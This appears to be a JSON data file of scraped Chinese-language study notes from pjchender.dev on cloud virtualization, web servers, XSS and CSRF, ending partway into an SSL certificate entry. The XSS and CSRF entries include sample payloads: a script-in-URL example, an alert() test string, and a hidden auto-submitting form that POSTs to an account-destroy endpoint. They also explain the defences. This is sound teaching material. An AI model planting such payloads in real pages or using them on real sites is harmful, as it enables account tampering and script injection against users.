aria-label=\"虛擬化（Virtualization）與雲端（Cloud）的直接連結\" title=\"虛擬化（Virtualization）與雲端（Cloud）的直接連結\">​</a></h2><p><strong>虛擬化（Virtualization）</strong>包含將單個實體裝置切分成一個或多個虛擬裝置（邏輯裝置）的技術，或者將多個實體裝置整合成一個大型虛擬裝置（邏輯裝置），讓它可以不受實體裝置的數量和設置地點，依照所需的需求新增／刪除電腦，升級／降級電腦設備。</p><p>透過虛擬化的服務，使用者可以直接透過網頁畫面，選擇想要使用的電腦、網路、建立系統和架構等多種服務（例如，虛擬主機服務、AWS, Google Cloud, Microsoft Azure），如此，使用者不需準備實體裝置也能使用各種服務。</p><p>這種透過虛擬化達到的雲端服務大致可以分為三類：</p><ul><li><strong>IaaS（Infrastructure as a Service，基礎架構即服務 ）</strong>：用來建立虛擬主機或虛擬網路的服務，對於外部使用者來說，它使用上就和一般的實體裝置無有太大差異，但由於是虛擬主機的緣故，當有特殊需求的時候，可以迅速增加主機的台數和設備規格。例如，Azure 虛擬主機，Amazon 虛擬主機的服務等。</li><li><strong>PaaS（Platform as a Service，平台即服務）</strong>：此種服務並非針對電腦主機本身，而是提供使用者所需的特定功能，像是建立資料庫、架設開發環境、使用者介面等，使用者只需將這些功能相互搭配，即可建立個人化的系統。例如，Heroku。</li><li><strong>SaaS（Software as a Service，軟體即服務）</strong>：直接提供網路服務給使用者，像是電子郵件、Google 表單、Google 相簿等等。</li></ul><p><img loading=\"lazy\" src=\"../../../i.imgur.com/aJGRfDl.png\" alt=\"imgur\" class=\"img_ev3q\"></p><blockquote><p>Photo credits: <a href=\"https://serverguy.com/comparison/digitalocean-vs-aws-ec2/\" target=\"_blank\" rel=\"noopener noreferrer\">survey guy</a></p></blockquote><p>近年來則出現新的 <strong>SDN（Software Defined Networking，軟體定義網路）</strong>服務，透過 SDN 可以切分為「資料傳遞」和「傳遞控制」兩部分，使用者可以依照自己的需求搭配所需的網路功能。而 <strong>OpenFlow</strong> 這是將這樣的想法具體化的規範。</p><blockquote><p><a href=\"https://www.ibm.com/cloud-computing/tw-zh/learn-more/iaas-paas-saas/\" target=\"_blank\" rel=\"noopener noreferrer\">IaaS PaaS SaaS - 雲端服務模式</a> @ IBM</p></blockquote><h2 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"資料來源\">資料來源<a href=\"#資料來源\" class=\"hash-link\" aria-label=\"資料來源的直接連結\" title=\"資料來源的直接連結\">​</a></h2><ul><li><a href=\"https://ithelp.ithome.com.tw/users/20107304/ironman/1258\" target=\"_blank\" rel=\"noopener noreferrer\">鯊魚咬電纜：30 天玩 Wireshark</a> @ IThome</li><li><a href=\"http://www.flag.com.tw/book/5105.asp?bokno=FT176\" target=\"_blank\" rel=\"noopener noreferrer\">MIS 一定要懂的 82 個網路技術知識</a> @ 旗標出版</li><li><a href=\"https://hacks.mozilla.org/2018/05/a-cartoon-intro-to-dns-over-https/\" target=\"_blank\" rel=\"noopener noreferrer\">A cartoon intro to DNS over HTTPS</a> @ Mozilla Hacks</li></ul></div>",
      "<style>.buttonGroup__atx{display:none;}",
      "pre {background-color: rgb(41,45,62);}</style>"
    ],
    "description": "https://pjchender.dev"
  },
  "hinternet [網際網路] Web Server 是什麼 pjchender.dev": {
    "prefix": "hinternet [網際網路] Web Server 是什麼 pjchender.dev",
    "type": "html",
    "isCode": false,
    "body": [
      "<div><h1>[網際網路] Web Server 是什麼</h1></header><blockquote><p>此篇為各筆記之整理，非原創內容，資料來源可見下方連結與文後參考資料。</p></blockquote><h2 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"web-server-的幾種分類\">Web Server 的幾種分類<a href=\"#web-server-的幾種分類\" class=\"hash-link\" aria-label=\"Web Server 的幾種分類的直接連結\" title=\"Web Server 的幾種分類的直接連結\">​</a></h2><blockquote><p><a href=\"https://developer.mozilla.org/en-US/docs/Learn/Common_questions/What_is_a_web_server\" target=\"_blank\" rel=\"noopener noreferrer\">What is a web server?</a> @ MDN &gt; Learn Web Development &gt; Common Questions</p></blockquote><p>Web Server 在不同的使用時機可能會指稱不同的意思：</p><ul><li>從硬體（hardware）的層面來說，它指的是保存有伺服器軟體和網頁相關檔案的實體電腦，透過 web server 將會連接到網際網路，並且與其他網路上的裝置進行物理上的資料交換。</li><li>從軟體（software）的層面來說，web server 則是控制使用者可以存取到哪些檔案，更細的來說，HTTP web server 就是在處理 request 和 response 之間的關係</li></ul><p>Web Server 又可以分成 static web server 和 dynamic web server</p><ul><li><strong>static web server</strong> 或稱 stack，通常包含實體主機（hardware），並解安裝有 HTTP server（software）在內，當 client 透過瀏覽器發送請求時，靜態網頁伺服器會直接將原始的檔案不加修改的傳回去給 client。</li><li><strong>dynamic web server</strong> 包含了 static web serve 以及許多其他的軟體，特別像是 <strong>application server</strong> 和 <strong>database</strong>，當 client 透過瀏覽器發送請求後，會先將檔案的內容進行調整（例如，把資料庫的資料放入 HTML 模板中）後才傳送回去給 client。</li></ul><h2 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"web-server-和-application-server-的差別\">Web Server 和 Application Server 的差別<a href=\"#web-server-和-application-server-的差別\" class=\"hash-link\" aria-label=\"Web Server 和 Application Server 的差別的直接連結\" title=\"Web Server 和 Application Server 的差別的直接連結\">​</a></h2><blockquote><p><a href=\"https://www.ibm.com/cloud/learn/web-server-vs-application-server\" target=\"_blank\" rel=\"noopener noreferrer\">Web Server vs. Application Server</a> @ IBM Cloud</p></blockquote><p>實際上，並沒有明確的規範來區分 web server 和 application server 之間的差異，但一般來說可以這樣區分：</p><ul><li><strong>web server</strong> 的主要工作根據瀏覽器發送的請求，回傳靜態的網頁檔案（HTML pages、檔案、圖片、影片），並且通常是以 HTTP protocol 來進行。</li><li><strong>application server</strong> 雖然也會傳送網頁內容，但它主要的工作是在處理<strong>商業邏輯（business logic）</strong>，其中包含產生動態的內容，像是交易結果、報告分析的等等。</li></ul><p>然而，實際上，隨著使用者對於網頁應用程式的期待以及效能的提升，<strong>web server 和 application server 之間的界線越來越不明確</strong>。大部分的 web server 都支援使用指令碼語言（scripting language），並且提供網頁應用程式可以使用反向代理（reverse proxy）、叢集（clustering）、遺失備援（redundant）和負載平衡（load balancing）的服務。</p><p>常見的 web server 包含：</p><ul><li><strong>Nginx</strong>：這是一套開源的 web server 服務，其中包含了反向代理、負載平衡、郵件代理（mail proxy）、HTTP 快取等功能，知名的使用者包括 Dropbox, Netflix 和 Zynga。</li><li><strong>Apache HTTP Server</strong>：又稱作 Apache，是另一個非常熱門的開源免費 web server。</li><li><strong>Apache Tomcat</strong>：主要提供 Java application server 使用</li><li><strong>Glassfish</strong>：主要提供 Java application server 使用</li></ul><h2 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"資料來源\">資料來源<a href=\"#資料來源\" class=\"hash-link\" aria-label=\"資料來源的直接連結\" title=\"資料來源的直接連結\">​</a></h2><ul><li><a href=\"https://developer.mozilla.org/en-US/docs/Learn/Common_questions/What_is_a_web_server\" target=\"_blank\" rel=\"noopener noreferrer\">What is a web server?</a> @ MDN &gt; Learn Web Development &gt; Common Questions</li><li><a href=\"https://www.ibm.com/cloud/learn/web-server-vs-application-server\" target=\"_blank\" rel=\"noopener noreferrer\">Web Server vs. Application Server</a> @ IBM Cloud Learn Hub</li><li><a href=\"https://medium.com/@oldmo860617/web-server-nginx-1-cf5188459108\" target=\"_blank\" rel=\"noopener noreferrer\">Web Server &amp; Nginx — (1)</a> @ 莫力全 Kyle Mo</li></ul></div>",
      "<style>.buttonGroup__atx{display:none;}",
      "pre {background-color: rgb(41,45,62);}</style>"
    ],
    "description": "https://pjchender.dev"
  },
  "hinternet [IS] Cross-Site Scripting (XSS) pjchender.dev": {
    "prefix": "hinternet [IS] Cross-Site Scripting (XSS) pjchender.dev",
    "type": "html",
    "isCode": false,
    "body": [
      "<div><h1>[IS] Cross-Site Scripting (XSS)</h1></header><h2 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"cross-site-scripting-xss\">Cross-Site Scripting (XSS)<a href=\"#cross-site-scripting-xss\" class=\"hash-link\" aria-label=\"Cross-Site Scripting (XSS)的直接連結\" title=\"Cross-Site Scripting (XSS)的直接連結\">​</a></h2><p>Cross-site scripting (XSS) 是一種透過 <code>&lt;script&gt;</code> 來讓瀏覽器在未經過濾惡意程式碼的情況下將這些惡意程式執行在瀏覽器上，通常會透過網址來執行 JavaScript 或把 <code>&lt;script&gt;</code> 透過 input 存在 database，其他使用者讀取時則會載入惡意程式碼。</p><p>舉例來說：當受害者進入網頁時，執行惡意的 JavaScript 程式碼來讀取使用者的 Cookies，接著將竊取來的 credentials (cookie) 傳送到攻擊者的伺服器。</p><p>常見的 XSS 類型可以分成下面幾類：</p><h2 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"self-xss-or-reflected-xss--dom-based\">Self XSS or Reflected XSS / DOM-based<a href=\"#self-xss-or-reflected-xss--dom-based\" class=\"hash-link\" aria-label=\"Self XSS or Reflected XSS / DOM-based的直接連結\" title=\"Self XSS or Reflected XSS / DOM-based的直接連結\">​</a></h2><ul><li>透過使用者所發出的請求（例如，網址上），在伺服器回應後，將有害的內容顯示在頁面上</li></ul><div class=\"codeBlockContainer_Ckt0 theme-code-block\" style=\"--prism-color:#bfc7d5;--prism-background-color:#292d3e\"><div class=\"codeBlockContent_biex\"><pre tabindex=\"0\" class=\"prism-code language-text codeBlock_bY9V thin-scrollbar\"><code class=\"codeBlockLines_e6Vv\"><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">http://legitamite-bank.com/index.php?user=&amp;script&gt;here is some bad code!&lt;/script&gt;</span><br></span></code></pre><div class=\"buttonGroup__atx\"><button type=\"button\" aria-label=\"複製代碼至剪貼簿\" title=\"複製\" class=\"clean-btn\"><span class=\"copyButtonIcons_eSgA\" aria-hidden=\"true\"><svg viewBox=\"0 0 24 24\" class=\"copyButtonIcon_y97N\"><path fill=\"currentColor\" d=\"M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z\"></path></svg><svg viewBox=\"0 0 24 24\" class=\"copyButtonSuccessIcon_LjdS\"><path fill=\"currentColor\" d=\"M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z\"></path></svg></span></button></div></div></div><ul><li>需要用到社交工程（social engineering），常見情境像是攻擊者會寄送惡意連結給受害人，受害人點開連結後會進入到惡意的網頁，該網頁中的惡意程式會在受害者的瀏覽器中執行，以此竊取機密資訊等。</li></ul><p><img loading=\"lazy\" src=\"../../../i.imgur.com/K5piNEW.png\" alt=\"imgur\" class=\"img_ev3q\"></p><h2 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"stored-or-persistent\">Stored or Persistent<a href=\"#stored-or-persistent\" class=\"hash-link\" aria-label=\"Stored or Persistent的直接連結\" title=\"Stored or Persistent的直接連結\">​</a></h2><ul><li>將有害的內容存在伺服器上的資料庫、檔案系統內等，在使用者稍後瀏覽頁面時呈現。舉例來說，留言板、塗鴉牆或部落格的內容。</li><li>不需要使用到社交工程。</li></ul><h2 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"防範-xss\">防範 XSS<a href=\"#防範-xss\" class=\"hash-link\" aria-label=\"防範 XSS的直接連結\" title=\"防範 XSS的直接連結\">​</a></h2><p>要防範 XSS 最基本的作法對於所有不信任來源的 input 都要以 encode 後的方式呈現在瀏覽器上，而不是直接讓他執行：</p><ul><li>避免讓使用者在 input 中可以直接輸入 HTML</li><li><strong>驗證</strong>：使用者輸入的內容後，才把資料存入資料庫，例如，過濾掉 <code>&lt;script&gt;</code> 這類到標籤</li><li><strong>消毒</strong>：在將資料庫的內容呈現給使用者前，先對這些內容進行消毒（sanitize），例如將內容中的 HTML Body 和 attribute 內的 HTML Entities 都進行編碼</li></ul><h2 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"範例程式碼\">範例程式碼<a href=\"#範例程式碼\" class=\"hash-link\" aria-label=\"範例程式碼的直接連結\" title=\"範例程式碼的直接連結\">​</a></h2><p>任何會顯示使用者所提供資料的頁面，例如 message boards 或 comments。在 input 欄位內輸入 <code>&lt;script&gt;alert(&#x27;my javascript here&#x27;)&lt;/script&gt;</code> 看看是否有被執行。</p><h2 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"參考\">參考<a href=\"#參考\" class=\"hash-link\" aria-label=\"參考的直接連結\" title=\"參考的直接連結\">​</a></h2><ul><li><a href=\"https://excess-xss.com/\" target=\"_blank\" rel=\"noopener noreferrer\">excess-xss</a></li><li><a href=\"https://www.owasp.org/index.php/Main_Page\" target=\"_blank\" rel=\"noopener noreferrer\">OWASP</a>：包含各種資訊安全描述</li><li><a href=\"https://www.cloudflare.com/learning/security/threats/cross-site-scripting/\" target=\"_blank\" rel=\"noopener noreferrer\">Cross-site Scripting</a> @ CloudFlare</li><li><a href=\"https://blog.bitsrc.io/javascript-security-issues-and-best-practices-37e78df4dce4\" target=\"_blank\" rel=\"noopener noreferrer\">JavaScript Security Issues and Best Practices</a> @ Medium</li></ul></div>",
      "<style>.buttonGroup__atx{display:none;}",
      "pre {background-color: rgb(41,45,62);}</style>"
    ],
    "description": "https://pjchender.dev"
  },
  "hinternet [IS] 跨站偽造請求（Cross site request forgery, CSRF）是什麼？ pjchender.dev": {
    "prefix": "hinternet [IS] 跨站偽造請求（Cross site request forgery, CSRF）是什麼？ pjchender.dev",
    "type": "html",
    "isCode": false,
    "body": [
      "<div><h1>[IS] 跨站偽造請求（Cross site request forgery, CSRF）是什麼？</h1></header><h5 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"keywords-csrf-internet-security-one-click-attack-session-riding-xsrf\">keywords: <code>csrf</code>, <code>internet security</code>, <code>one-click-attack</code>, <code>session-riding</code>, <code>XSRF</code><a href=\"#keywords-csrf-internet-security-one-click-attack-session-riding-xsrf\" class=\"hash-link\" aria-label=\"keywords-csrf-internet-security-one-click-attack-session-riding-xsrf的直接連結\" title=\"keywords-csrf-internet-security-one-click-attack-session-riding-xsrf的直接連結\">​</a></h5><h2 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"cross-site-request-forgery-是什麼\">Cross Site Request Forgery 是什麼<a href=\"#cross-site-request-forgery-是什麼\" class=\"hash-link\" aria-label=\"Cross Site Request Forgery 是什麼的直接連結\" title=\"Cross Site Request Forgery 是什麼的直接連結\">​</a></h2><p><strong>跨站偽造請求（cross-site request forgery）</strong>也稱為 <strong>one-click attack</strong> 或 <strong>session riding</strong>，通常縮寫為 <strong>CSRF</strong>（有時發音為 sea-surf） 或 <strong>XSRF</strong>，這是一種利用伺服器所信任的網站來發送惡意請求的攻擊；和 cross-site scripting (XSS) 不同，XSS 是透過在網站上輸入惡意程式碼的方式來進行攻擊，通常利用的是「使用者對目標網站」的信任；而 CSRF 則是攻擊者利用「目標網站對該信用者」的信任。透過 CSRF 攻擊有機會讓使用者在無意間修改受害者的帳號密碼，或將帳戶內的金額轉帳給攻擊者。</p><p>CSRF 通常有以下流程：</p><ul><li>使用者使用正常流程登入「目標網站」</li><li>「惡意網站」利用目標網站對使用者的信任（credentials），例如 Cookies</li><li>欺騙使用者到「惡意網站」後，誘使使用者點擊某個按鈕，但這個按鈕可能會送出表單，而<strong>該表單的請求對象是對到「目標網站」</strong></li><li><strong>瀏覽器預設會把使用者在「目標網站」的 Cookie 連帶送出</strong>，因此雖然該請求是在「惡意網站」發出，但「目標網站」收到請求時因為帶有 credentials，所以會誤以為是合法的請求。</li></ul><h2 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"攻擊可能的樣子\">攻擊可能的樣子<a href=\"#攻擊可能的樣子\" class=\"hash-link\" aria-label=\"攻擊可能的樣子的直接連結\" title=\"攻擊可能的樣子的直接連結\">​</a></h2><p>使用者一旦點擊下方的連結，即會向「目標網站」送出 Post 請求：</p><div class=\"language-html codeBlockContainer_Ckt0 theme-code-block\" style=\"--prism-color:#bfc7d5;--prism-background-color:#292d3e\"><div class=\"codeBlockContent_biex\"><pre tabindex=\"0\" class=\"prism-code language-html codeBlock_bY9V thin-scrollbar\"><code class=\"codeBlockLines_e6Vv\"><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token comment\" style=\"color:rgb(105, 112, 152);font-style:italic\">&lt;!--</span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token comment\" style=\"color:rgb(105, 112, 152);font-style:italic\"> - Code from Rails Guides</span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token comment\" style=\"color:rgb(105, 112, 152);font-style:italic\"> - https://guides.rubyonrails.org/security.html#cross-site-request-forgery-csrf</span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token comment\" style=\"color:rgb(105, 112, 152);font-style:italic\">--&gt;</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\" style=\"display:inline-block\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\"></span><span class=\"token tag punctuation\" style=\"color:rgb(199, 146, 234)\">&lt;</span><span class=\"token tag\" style=\"color:rgb(255, 85, 114)\">a</span><span class=\"token tag\" style=\"color:rgb(255, 85, 114)\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token tag\" style=\"color:rgb(255, 85, 114)\">  </span><span class=\"token tag attr-name\" style=\"color:rgb(255, 203, 107)\">href</span><span class=\"token tag attr-value punctuation attr-equals\" style=\"color:rgb(199, 146, 234)\">=</span><span class=\"token tag attr-value punctuation\" style=\"color:rgb(199, 146, 234)\">&quot;</span><span class=\"token tag attr-value\" style=\"color:rgb(255, 85, 114)\">http://www.harmless.com/</span><span class=\"token tag attr-value punctuation\" style=\"color:rgb(199, 146, 234)\">&quot;</span><span class=\"token tag\" style=\"color:rgb(255, 85, 114)\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token tag\" style=\"color:rgb(255, 85, 114)\">  </span><span class=\"token tag special-attr attr-name\" style=\"color:rgb(255, 203, 107)\">onclick</span><span class=\"token tag special-attr attr-value punctuation attr-equals\" style=\"color:rgb(199, 146, 234)\">=</span><span class=\"token tag special-attr attr-value punctuation\" style=\"color:rgb(199, 146, 234)\">&quot;</span><span class=\"token tag special-attr attr-value\" style=\"color:rgb(255, 85, 114)\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token tag special-attr attr-value\" style=\"color:rgb(255, 85, 114)\">  var f = document.createElement(</span><span class=\"token tag special-attr attr-value punctuation\" style=\"color:rgb(199, 146, 234)\">&#x27;</span><span class=\"token tag special-attr attr-value\" style=\"color:rgb(255, 85, 114)\">form</span><span class=\"token tag special-attr attr-value punctuation\" style=\"color:rgb(199, 146, 234)\">&#x27;</span><span class=\"token tag special-attr attr-value\" style=\"color:rgb(255, 85, 114)\">);</span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token tag special-attr attr-value\" style=\"color:rgb(255, 85, 114)\">  f.style.display = </span><span class=\"token tag special-attr attr-value punctuation\" style=\"color:rgb(199, 146, 234)\">&#x27;</span><span class=\"token tag special-attr attr-value\" style=\"color:rgb(255, 85, 114)\">none</span><span class=\"token tag special-attr attr-value punctuation\" style=\"color:rgb(199, 146, 234)\">&#x27;</span><span class=\"token tag special-attr attr-value\" style=\"color:rgb(255, 85, 114)\">;</span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token tag special-attr attr-value\" style=\"color:rgb(255, 85, 114)\">  this.parentNode.appendChild(f);</span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token tag special-attr attr-value\" style=\"color:rgb(255, 85, 114)\">  f.method = </span><span class=\"token tag special-attr attr-value punctuation\" style=\"color:rgb(199, 146, 234)\">&#x27;</span><span class=\"token tag special-attr attr-value\" style=\"color:rgb(255, 85, 114)\">POST</span><span class=\"token tag special-attr attr-value punctuation\" style=\"color:rgb(199, 146, 234)\">&#x27;</span><span class=\"token tag special-attr attr-value\" style=\"color:rgb(255, 85, 114)\">;</span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token tag special-attr attr-value\" style=\"color:rgb(255, 85, 114)\">  f.action = </span><span class=\"token tag special-attr attr-value punctuation\" style=\"color:rgb(199, 146, 234)\">&#x27;</span><span class=\"token tag special-attr attr-value\" style=\"color:rgb(255, 85, 114)\">http://www.example.com/account/destroy</span><span class=\"token tag special-attr attr-value punctuation\" style=\"color:rgb(199, 146, 234)\">&#x27;</span><span class=\"token tag special-attr attr-value\" style=\"color:rgb(255, 85, 114)\">;</span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token tag special-attr attr-value\" style=\"color:rgb(255, 85, 114)\">  f.submit();</span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token tag special-attr attr-value\" style=\"color:rgb(255, 85, 114)\">  return false;</span><span class=\"token tag special-attr attr-value punctuation\" style=\"color:rgb(199, 146, 234)\">&quot;</span><span class=\"token tag\" style=\"color:rgb(255, 85, 114)\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token tag\" style=\"color:rgb(255, 85, 114)\">  </span><span class=\"token tag punctuation\" style=\"color:rgb(199, 146, 234)\">&gt;</span><span class=\"token plain\">To the harmless survey</span><span class=\"token tag punctuation\" style=\"color:rgb(199, 146, 234)\">&lt;/</span><span class=\"token tag\" style=\"color:rgb(255, 85, 114)\">a</span><span class=\"token tag\" style=\"color:rgb(255, 85, 114)\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token tag\" style=\"color:rgb(255, 85, 114)\"></span><span class=\"token tag punctuation\" style=\"color:rgb(199, 146, 234)\">&gt;</span><br></span></code></pre><div class=\"buttonGroup__atx\"><button type=\"button\" aria-label=\"複製代碼至剪貼簿\" title=\"複製\" class=\"clean-btn\"><span class=\"copyButtonIcons_eSgA\" aria-hidden=\"true\"><svg viewBox=\"0 0 24 24\" class=\"copyButtonIcon_y97N\"><path fill=\"currentColor\" d=\"M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z\"></path></svg><svg viewBox=\"0 0 24 24\" class=\"copyButtonSuccessIcon_LjdS\"><path fill=\"currentColor\" d=\"M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z\"></path></svg></span></button></div></div></div><p>或者使用者只要將滑鼠移過某一張圖片時，即透過 JavaScript 執行指令：</p><div class=\"language-html codeBlockContainer_Ckt0 theme-code-block\" style=\"--prism-color:#bfc7d5;--prism-background-color:#292d3e\"><div class=\"codeBlockContent_biex\"><pre tabindex=\"0\" class=\"prism-code language-html codeBlock_bY9V thin-scrollbar\"><code class=\"codeBlockLines_e6Vv\"><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token comment\" style=\"color:rgb(105, 112, 152);font-style:italic\">&lt;!--</span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token comment\" style=\"color:rgb(105, 112, 152);font-style:italic\"> - Code from Rails Guides</span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token comment\" style=\"color:rgb(105, 112, 152);font-style:italic\"> - https://guides.rubyonrails.org/security.html#cross-site-request-forgery-csrf</span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token comment\" style=\"color:rgb(105, 112, 152);font-style:italic\">--&gt;</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\"></span><span class=\"token tag punctuation\" style=\"color:rgb(199, 146, 234)\">&lt;</span><span class=\"token tag\" style=\"color:rgb(255, 85, 114)\">img</span><span class=\"token tag\" style=\"color:rgb(255, 85, 114)\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token tag\" style=\"color:rgb(255, 85, 114)\">  </span><span class=\"token tag attr-name\" style=\"color:rgb(255, 203, 107)\">src</span><span class=\"token tag attr-value punctuation attr-equals\" style=\"color:rgb(199, 146, 234)\">=</span><span class=\"token tag attr-value punctuation\" style=\"color:rgb(199, 146, 234)\">&quot;</span><span class=\"token tag attr-value\" style=\"color:rgb(255, 85, 114)\">http://www.harmless.com/img</span><span class=\"token tag attr-value punctuation\" style=\"color:rgb(199, 146, 234)\">&quot;</span><span class=\"token tag\" style=\"color:rgb(255, 85, 114)\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token tag\" style=\"color:rgb(255, 85, 114)\">  </span><span class=\"token tag attr-name\" style=\"color:rgb(255, 203, 107)\">width</span><span class=\"token tag attr-value punctuation attr-equals\" style=\"color:rgb(199, 146, 234)\">=</span><span class=\"token tag attr-value punctuation\" style=\"color:rgb(199, 146, 234)\">&quot;</span><span class=\"token tag attr-value\" style=\"color:rgb(255, 85, 114)\">400</span><span class=\"token tag attr-value punctuation\" style=\"color:rgb(199, 146, 234)\">&quot;</span><span class=\"token tag\" style=\"color:rgb(255, 85, 114)\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token tag\" style=\"color:rgb(255, 85, 114)\">  </span><span class=\"token tag attr-name\" style=\"color:rgb(255, 203, 107)\">height</span><span class=\"token tag attr-value punctuation attr-equals\" style=\"color:rgb(199, 146, 234)\">=</span><span class=\"token tag attr-value punctuation\" style=\"color:rgb(199, 146, 234)\">&quot;</span><span class=\"token tag attr-value\" style=\"color:rgb(255, 85, 114)\">400</span><span class=\"token tag attr-value punctuation\" style=\"color:rgb(199, 146, 234)\">&quot;</span><span class=\"token tag\" style=\"color:rgb(255, 85, 114)\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token tag\" style=\"color:rgb(255, 85, 114)\">  </span><span class=\"token tag special-attr attr-name\" style=\"color:rgb(255, 203, 107)\">onmouseover</span><span class=\"token tag special-attr attr-value punctuation attr-equals\" style=\"color:rgb(199, 146, 234)\">=</span><span class=\"token tag special-attr attr-value punctuation\" style=\"color:rgb(199, 146, 234)\">&quot;</span><span class=\"token tag special-attr attr-value value javascript language-javascript spread operator\" style=\"color:rgb(137, 221, 255)\">...</span><span class=\"token tag special-attr attr-value punctuation\" style=\"color:rgb(199, 146, 234)\">&quot;</span><span class=\"token tag\" style=\"color:rgb(255, 85, 114)\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token tag\" style=\"color:rgb(255, 85, 114)\"></span><span class=\"token tag punctuation\" style=\"color:rgb(199, 146, 234)\">/&gt;</span><br></span></code></pre><div class=\"buttonGroup__atx\"><button type=\"button\" aria-label=\"複製代碼至剪貼簿\" title=\"複製\" class=\"clean-btn\"><span class=\"copyButtonIcons_eSgA\" aria-hidden=\"true\"><svg viewBox=\"0 0 24 24\" class=\"copyButtonIcon_y97N\"><path fill=\"currentColor\" d=\"M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z\"></path></svg><svg viewBox=\"0 0 24 24\" class=\"copyButtonSuccessIcon_LjdS\"><path fill=\"currentColor\" d=\"M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z\"></path></svg></span></button></div></div></div><h2 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"解決方式\">解決方式<a href=\"#解決方式\" class=\"hash-link\" aria-label=\"解決方式的直接連結\" title=\"解決方式的直接連結\">​</a></h2><p>現在多數的框架都支援去防範 CSRF 的攻擊。舉例來說，在 Ruby on Rails 的網頁應用程式中，由本站的表單或透過 AJAX 向伺服器發送的請求中都加上 security token（<code>X-CSRF-Token</code>），並於伺服器端驗證此 Token。由於這個 Token 只能在瀏覽本站時取得，因此攻擊者透過惡意網站試圖向伺服器發送請求時，雖然這個請求帶有認證過的 Cookie，但因為它並沒有帶有合法的 X-CSRF-Token，Rails 在處理此請求時會拋出錯誤。</p><h2 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"參考\">參考<a href=\"#參考\" class=\"hash-link\" aria-label=\"參考的直接連結\" title=\"參考的直接連結\">​</a></h2><ul><li><a href=\"https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html\" target=\"_blank\" rel=\"noopener noreferrer\">Cross-Site Request Forgery Prevention Cheat Sheet</a> @ OWASP Cheat Sheet</li><li><a href=\"https://www.cloudflare.com/learning/security/threats/cross-site-request-forgery/\" target=\"_blank\" rel=\"noopener noreferrer\">What is Cross-Site Request Forgery?</a> @ Cloud Flare</li><li><a href=\"https://guides.rubyonrails.org/security.html#cross-site-request-forgery-csrf\" target=\"_blank\" rel=\"noopener noreferrer\">Cross Site Request Forgery</a> @ Rails Guides</li><li><a href=\"https://ithelp.ithome.com.tw/users/20107304/ironman/2006\" target=\"_blank\" rel=\"noopener noreferrer\">資安補漏洞，越補越大洞</a> @ iT 邦幫忙</li></ul></div>",
      "<style>.buttonGroup__atx{display:none;}",
      "pre {background-color: rgb(41,45,62);}</style>"
    ],
    "description": "https://pjchender.dev"
  },
  "hinternet [IS] 產生 SSL 憑證 pjchender.dev": {
    "prefix": "hinternet [IS] 產生 SSL 憑證 pjchender.dev",
    "type": "html",
    "isCode": false,
    "body": [
